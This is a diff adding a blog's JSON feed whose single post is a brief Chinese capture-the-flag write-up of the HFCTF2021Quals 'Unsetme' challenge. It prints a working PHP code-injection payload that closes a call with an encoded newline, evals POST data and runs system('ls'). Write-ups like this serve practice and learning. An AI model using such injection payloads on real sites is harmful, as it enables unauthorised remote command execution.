@@ -1,0 +1,19 @@
+{
+    "version": "https://jsonfeed.org/version/1",
+    "title": "Hexo • All posts by \"命令执行\" tag",
+    "description": "",
+    "home_page_url": "http://odiws.github.io",
+    "items": [
+        {
+            "id": "http://odiws.github.io/2024/11/05/HFCTF2021Quals-Unsetme/",
+            "url": "http://odiws.github.io/2024/11/05/HFCTF2021Quals-Unsetme/",
+            "title": "[HFCTF2021Quals]Unsetme",
+            "date_published": "2024-11-05T07:51:46.000Z",
+            "content_html": "<h3 id=\"hfctf2021qualsunsetme\"><a class=\"markdownIt-Anchor\" href=\"#hfctf2021qualsunsetme\">#</a> [HFCTF2021Quals]Unsetme</h3>\n<p>进去是这样的：</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202411051552267.png\" alt=\"image-20241105155247891\"></p>\n<p>感觉应该是要给源码的，但是没给，那就只能 wp 大法了，</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202411051553804.png\" alt=\"image-20241105155340638\"></p>\n<p>可以看见这个 $val 就是我们传的 a 参数，这个有点类似于 SQL 注入的感觉，也有点像 ping 的感觉（中间可以加东西，两端得闭合一下）</p>\n<p>左边是（我可以是用 a%0a)(%0a 是截止符，没它中间的东西不会执行（不太理解），右边是）；我可以直接 phpinfo（执行闭合)</p>\n<p>基本上就是</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">?</span>a<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">%</span><span class=\"token number\">0</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">phpinfo</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token constant\">POST</span>：<span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"ls\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202411051559871.png\" alt=\"image-20241105155948660\"></p>\n<p>参考链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xpdHRsZV9qY2FrL2FydGljbGUvZGV0YWlscy8xMjM1MTY0Mzk=\">https://blog.csdn.net/Little_jcak/article/details/123516439</span></p>\n",
+            "tags": [
+                "buuctf",
+                "命令执行"
+            ]
+        }
+    ]
+}
